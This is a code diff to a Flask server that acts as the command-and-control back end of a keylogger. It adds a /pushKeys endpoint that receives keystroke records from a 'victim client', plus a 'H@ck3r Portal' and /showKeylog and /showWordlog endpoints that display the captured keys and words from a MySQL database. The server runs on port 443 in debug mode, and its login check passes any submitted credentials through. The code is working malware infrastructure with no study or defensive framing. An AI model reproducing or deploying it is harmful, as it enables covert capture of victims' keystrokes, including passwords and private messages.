@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, make_response, jsonify
+from flask import Flask, render_template, request, make_response, jsonify, redirect, url_for
 import json
 from json import JSONEncoder
 import mysql.connector
@@ -11,14 +11,35 @@ app = Flask(__name__, template_folder='templates')
 
 main_cfg = load_cfg('./main_cfg.json')
 
+# Convert SQL datetime type to JSON readable format
 def datetime_converter(o):
   if isinstance(o,datetime):
       return o.__str__()
-    
+
+#######################################
+#                                     
+#       Login page         
+#                                     
+#######################################
 @app.route('/')
 def hello():
     return render_template('index.html')
+    
+@app.route('/checkLogin', methods=['POST'])
+def validate():
+  username = request.form['username']
+  password = request.form['password']
+  
+  if (username and password):
+    print("NO!")
+    return redirect(url_for('hacker'))
 
+
+#######################################
+#                                     
+#       Send data from victim client to be processed            
+#                                     
+#######################################
 @app.route('/pushKeys', methods=['POST'])
 def addLog():
   data = json.loads(request.data)
@@ -26,7 +47,6 @@ def addLog():
 
   for key in range(len(data)):      
     try:
-      # pushDB_keys(process,json.loads(data[str(key)]))
       process.addKey(data[str(key)])
       
 
@@ -34,42 +54,19 @@ def addLog():
       print("Exception:",e)
 
       return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
-  
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
 
-'''
-def pushDB_keys(process,payload):
-  if (payload['keyName'] != "Space" or payload['keyName'] != "Return"):
-    process.separateBreakChar(payload)
-    
-  main_cfg = load_cfg('./main_cfg.json')
-
-  db = mysql.connector.connect (
-    host=main_cfg['dbHost'],
-    port=main_cfg['port'],
-    user=main_cfg['sqlUser'],
-    password=main_cfg['sqlPass'],
-    database=main_cfg['db']
-  )
-  
-  mycursor = db.cursor()
-  
-  sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
-  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
-  
-  mycursor.execute(sql, val)
-  
-  db.commit()
-  return 0 
-'''
-
-@app.route('/Hacker', methods=['GET'])
-def showKeylog():
+#######################################
+#                                     
+#         H@ck3r Portal            
+#                                     
+#######################################
+@app.route('/hacker', methods=['GET'])
+def hacker():
   return render_template('base.html')
 
 @app.route('/showKeylog', methods=['GET'])
 def pushKeylog():  
-
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
     port=main_cfg['port'],
@@ -79,7 +76,6 @@ def pushKeylog():
   )
   
   mycursor = db.cursor()
-  
   res = {}
   
   sql = f"SELECT * FROM {main_cfg['dbKeyTable']}"
@@ -94,7 +90,6 @@ def pushKeylog():
 
 @app.route('/showWordlog', methods=['GET'])
 def pushWordlog():  
-
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
     port=main_cfg['port'],
@@ -102,9 +97,7 @@ def pushWordlog():
     password=main_cfg['sqlPass'],
     database=main_cfg['db']
   )
-  
   mycursor = db.cursor()
-  
   res = {}
   
   sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
@@ -114,12 +107,9 @@ def pushWordlog():
   
   mycursor.close()
   db.close()
-  print(res)
 
   return res
-  
   
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int("443"), debug=True)
-    #app.run(debug=True)
